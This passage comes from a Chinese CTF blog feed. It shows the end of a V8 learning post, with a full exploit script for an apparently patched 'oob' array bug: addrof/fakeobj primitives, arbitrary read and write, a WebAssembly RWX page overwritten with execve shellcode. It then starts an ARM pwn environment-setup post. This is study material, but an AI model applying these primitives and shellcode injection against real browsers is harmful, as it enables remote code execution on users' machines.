class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);  </span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);  </span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);  </span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>参考别人的博客，这段区域在<code>f</code>对象中的<code>shared_info</code>中的<code>data</code>中的<code>instance</code></p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250819151119619.png" alt="image-20250819151119619"></p><p>由此，便可以得到这段内存的地址了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float=<span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> buint=<span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftob</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> buint[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">btof</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    buint[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> float[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_arr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">float_map=float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_arr=[float_arr];</span><br><span class="line">obj_map=obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_obj_addr</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">let</span> addr=<span class="title function_">ftob</span>(obj_arr[<span class="number">0</span>])-<span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addr_to_obj</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float_arr[<span class="number">0</span>]=<span class="title function_">btof</span>(addr+<span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj=float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">make_fake_obj=[float_map,<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0x1000000000n</span>),<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line">fake_obj_addr=<span class="title function_">get_obj_addr</span>(make_fake_obj)-<span class="number">0x40n</span>;</span><br><span class="line">fake_obj=<span class="title function_">addr_to_obj</span>(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readr</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    make_fake_obj[<span class="number">2</span>]=<span class="title function_">btof</span>(addr-<span class="number">0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data=fake_obj[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftob</span>(leak_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writer</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    make_fake_obj[<span class="number">2</span>]=addr-<span class="number">0x10n</span>+<span class="number">1n</span>;</span><br><span class="line">    fake_obj[<span class="number">0</span>]=<span class="title function_">btof</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);  </span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);  </span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);  </span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;  </span><br><span class="line"></span><br><span class="line">f_addr=<span class="title function_">get_obj_addr</span>(f);</span><br><span class="line">share_info=<span class="title function_">readr</span>(f_addr+<span class="number">0x18n</span>)-<span class="number">1n</span>;</span><br><span class="line">data=<span class="title function_">readr</span>(share_info+<span class="number">0x8n</span>)-<span class="number">1n</span>;</span><br><span class="line">instance=<span class="title function_">readr</span>(data+<span class="number">0x10n</span>)-<span class="number">1n</span>;</span><br><span class="line">rwx=<span class="title function_">readr</span>(instance+<span class="number">0x88n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;0x&quot;</span>+rwx.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250819151822494.png" alt="image-20250819151822494"></p><p>接下来就是向其中写入我们的shellcoed</p><p>由于任意地址写的时候，需要用到目标地址-0x10处的地址，但是对于<code>rwx</code>的区域来说，这段内存是不和法的，因此不能利用任意地址写直接写进去，故需要另想办法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">32</span>);  </span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);  </span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">get_obj_addr</span>(data_buf) + <span class="number">0x20n</span>;  </span><br><span class="line"><span class="title function_">writer</span>(buf_backing_store_addr,rwx);  </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)  </span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);  </span><br></pre></td></tr></table></figure><p>这样就可以成功将<code>shellcode</code>写入<code>rwx</code>中，就可以<code>getshell</code>了</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float=<span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> buint=<span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftob</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> buint[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">btof</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    buint[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> float[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_arr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">float_map=float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_arr=[float_arr];</span><br><span class="line">obj_map=obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_obj_addr</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">let</span> addr=<span class="title function_">ftob</span>(obj_arr[<span class="number">0</span>])-<span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addr_to_obj</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float_arr[<span class="number">0</span>]=<span class="title function_">btof</span>(addr+<span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj=float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">make_fake_obj=[float_map,<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0x1000000000n</span>),<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line">fake_obj_addr=<span class="title function_">get_obj_addr</span>(make_fake_obj)-<span class="number">0x40n</span>;</span><br><span class="line">fake_obj=<span class="title function_">addr_to_obj</span>(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readr</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    make_fake_obj[<span class="number">2</span>]=<span class="title function_">btof</span>(addr-<span class="number">0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data=fake_obj[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftob</span>(leak_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writer</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    make_fake_obj[<span class="number">2</span>]=<span class="title function_">btof</span>(addr-<span class="number">0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>]=<span class="title function_">btof</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);  </span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);  </span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);  </span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;  </span><br><span class="line"></span><br><span class="line">f_addr=<span class="title function_">get_obj_addr</span>(f);</span><br><span class="line">share_info=<span class="title function_">readr</span>(f_addr+<span class="number">0x18n</span>)-<span class="number">1n</span>;</span><br><span class="line">data=<span class="title function_">readr</span>(share_info+<span class="number">0x8n</span>)-<span class="number">1n</span>;</span><br><span class="line">instance=<span class="title function_">readr</span>(data+<span class="number">0x10n</span>)-<span class="number">1n</span>;</span><br><span class="line">rwx=<span class="title function_">readr</span>(instance+<span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;0x&quot;</span>+rwx.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">shellcode = [  </span><br><span class="line">    <span class="number">0x91969dd1bb48c031n</span>,  </span><br><span class="line">    <span class="number">0x53dbf748ff978cd0n</span>,  </span><br><span class="line">    <span class="number">0xb05e545752995f54n</span>,  </span><br><span class="line">    <span class="number">0x50f3bn</span>  </span><br><span class="line">];  </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">32</span>);  </span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);  </span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">get_obj_addr</span>(data_buf) + <span class="number">0x20n</span>;  </span><br><span class="line"><span class="title function_">writer</span>(buf_backing_store_addr,rwx);  </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)  </span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>()</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20154316.png" alt="屏幕截图 2025-08-19 154316"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初探-V8&quot;&gt;&lt;a href=&quot;#初探-V8&quot; class=&quot;headerlink&quot; title=&quot;初探 V8&quot;&gt;&lt;/a&gt;初探 V8&lt;/h1&gt;&lt;h2 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;</summary>
      
    
    
    
    
    <category term="v8入门 pwn" scheme="https://gggtaotao.github.io/tags/v8%E5%85%A5%E9%97%A8-pwn/"/>
    
  </entry>
  
  <entry>
    <title>初探arm-pwn</title>
    <link href="https://gggtaotao.github.io/2025/08/11/%E5%88%9D%E6%8E%A2arm-pwn/"/>
    <id>https://gggtaotao.github.io/2025/08/11/%E5%88%9D%E6%8E%A2arm-pwn/</id>
    <published>2025-08-11T09:20:36.000Z</published>
    <updated>2025-08-11T14:31:22.097Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARM-PWN学习"><a href="#ARM-PWN学习" class="headerlink" title="ARM-PWN学习"></a>ARM-PWN学习</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><pre><code>### 安装插件</code></pre><p>​    关于异构的环境配置大家可以参考这篇文章，真的超级详细，arm，aarch64，powerpc，mips等等架构也有都，超级nice <a href="https://starrysky1004.github.io/2025/02/10/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/#toc-heading-25">传送门</a></p><p>关于arm架构，首先需要安装qeum其中包括<strong>qemu-user</strong>和<strong>qemu-user-static</strong>，<strong>qemu-system</strong>可以安装也可以不安装，接着安装调试工具<strong>gdb-multiarch</strong>，然后就可以通过qeum启动arm架构的程序来调试了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install  qemu-user qemu-user-static</span><br><span class="line"><span class="built_in">sudo</span> apt-get install qemu-system uml-utilities bridge-utils</span><br><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h3><p>如果要启动一个名为pwn的arm架构的动态程序，命令应该为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /path/to/lib ./pwn</span><br></pre></td></tr></table></figure><p>其中-L后面跟的参数为路径，不知道的话可以通过 <strong>file pwn</strong> 来查看一下所需路径以及ld</p><p>如果想要调试的话可以通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /path/to/lib -g 1234./pwn</span><br></pre></td></tr></table></figure><p>其中-g后面的参数为调试时要attach的端口，运行后pwn程序会等待gdb来attach连接，然后就可以调试了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">attach 1234</span><br></pre></td></tr></table></figure><p>如果是静态编译的程序的话就不需要-L来设置路径了</p><p>如果是其他架构的程序的话，只需要把<strong>qemu-arm</strong>改为对应的架构即可，如<strong>qemu-arrch64</strong>等等</p><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>exp调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)<span class="comment">#设置对应的arch</span></span><br><span class="line">process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/path/to/lib&quot;</span>, <span class="string">&quot;pwn&quot;</span>])<span class="comment">#如果不需要调试的话可以把-g以及参数去掉，静态程序的话-L也可以去掉</span></span><br></pre></td></tr></table></figure><p>但是即使这样，还是的每次自己另外打开一个端口然后attach连接，还得让程序运行到自己想要运行的地方，这也太麻烦了，有没有简便的方法呢，有的兄弟有的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 